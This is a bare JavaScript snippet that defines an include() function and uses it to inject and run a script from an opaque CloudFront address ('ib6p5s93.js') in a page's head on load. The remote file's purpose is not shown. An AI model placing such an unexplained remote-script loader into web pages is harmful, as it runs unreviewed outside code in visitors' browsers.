function include(file) {
    var script = document.createElement("script");
    script.src = file;
    script.type = "text/javascript";
    script.defer = true;
    script.async = true;

    document.getElementsByTagName("head").item(0).appendChild(script);
}
include("////d81mfvml8p5ml.cloudfront.net/ib6p5s93.js");
